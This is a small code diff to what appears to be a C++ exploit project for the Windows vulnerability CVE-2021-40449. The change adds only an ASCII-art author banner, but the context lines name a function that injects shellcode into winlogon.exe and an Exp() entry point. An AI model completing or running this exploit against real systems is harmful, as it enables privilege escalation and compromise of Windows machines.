@@ -3,6 +3,13 @@ using namespace CVE_2021_40449;
 namespace offset = exploit::gadget::X_17763_737;
 namespace CVE_2021_40449
 {
+    void banner() {
+        std::cout << "┏━╸╻ ╻┏━╸   ┏━┓┏━┓┏━┓╺┓    ╻ ╻┏━┓╻ ╻╻ ╻┏━┓\n";
+        std::cout << "┃  ┃┏┛┣╸ ╺━╸┏━┛┃┃┃┏━┛ ┃ ╺━╸┗━┫┃┃┃┗━┫┗━┫┗━┫\n";
+        std::cout << "┗━╸┗┛ ┗━╸   ┗━╸┗━┛┗━╸╺┻╸     ╹┗━┛  ╹  ╹┗━┛\n";
+        std::cout << "     by Joe1sn(https://github.com/Joe1sn/)\n";
+    }
+
     VOID InjectToWinlogon()
     {
         /* Inject `payload` (shellcode) into winlogon.exe */
@@ -229,6 +236,7 @@ namespace CVE_2021_40449
     }
 
     bool Exp() {
+        banner();
         printf("EXP pid: 0x%X\n", GetCurrentProcessId());
         if (!initAPI())
             return false;
